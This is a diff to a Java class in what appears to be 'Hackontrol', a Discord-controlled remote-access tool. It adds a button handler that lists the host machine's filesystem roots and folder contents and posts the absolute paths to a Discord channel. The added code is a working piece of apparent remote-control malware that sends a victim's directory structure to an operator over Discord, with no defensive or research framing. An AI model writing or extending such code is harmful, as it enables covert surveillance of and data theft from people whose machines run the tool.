@@ -1,8 +1,12 @@
 package com.khopan.hackontrol.panel;
 
+import java.io.File;
+
 import com.khopan.hackontrol.manager.interaction.ButtonManager;
 import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
 import com.khopan.hackontrol.registry.Registration;
+import com.khopan.hackontrol.utils.HackontrolMessage;
+import com.khopan.hackontrol.utils.sendable.ISendable;
 import com.khopan.hackontrol.widget.ControlWidget;
 
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
@@ -12,6 +16,8 @@ public class FilePanel extends Panel {
 
 	private static final Button BUTTON_LIST_ROOT = ButtonManager.staticButton(ButtonType.SUCCESS, "List Root", "listRoot");
 
+	private static final String PATHNAME_SYSTEM_ROOT = "SYSTEMROOT";
+
 	@Override
 	public String panelName() {
 		return FilePanel.PANEL_NAME;
@@ -19,7 +25,7 @@ public class FilePanel extends Panel {
 
 	@Override
 	public void registeration() {
-		this.register(Registration.BUTTON, FilePanel.BUTTON_LIST_ROOT, null);
+		this.register(Registration.BUTTON, FilePanel.BUTTON_LIST_ROOT, context -> this.sendFileList(null, context.reply()));
 	}
 
 	@Override
@@ -29,5 +35,40 @@ public class FilePanel extends Panel {
 				.actionRow(FilePanel.BUTTON_LIST_ROOT)
 				.build()
 		};
+	}
+
+	private void sendFileList(File folder, ISendable sender) {
+		File[] files;
+		String pathName;
+
+		if(folder == null) {
+			files = File.listRoots();
+			pathName = FilePanel.PATHNAME_SYSTEM_ROOT;
+		} else {
+			if(!folder.isDirectory()) {
+				folder = folder.getParentFile();
+			}
+
+			files = folder.listFiles();
+			pathName = folder.getAbsolutePath();
+		}
+
+		if(files.length == 1 && files[0].isDirectory()) {
+			this.sendFileList(files[0], sender);
+			return;
+		}
+
+		StringBuilder builder = new StringBuilder();
+		builder.append("**");
+		builder.append(pathName);
+		builder.append("**\n```\n");
+
+		for(File file : files) {
+			builder.append(file.getAbsolutePath());
+			builder.append('\n');
+		}
+
+		builder.append("\n```");
+		HackontrolMessage.deletable(sender, builder.toString());
 	}
 }
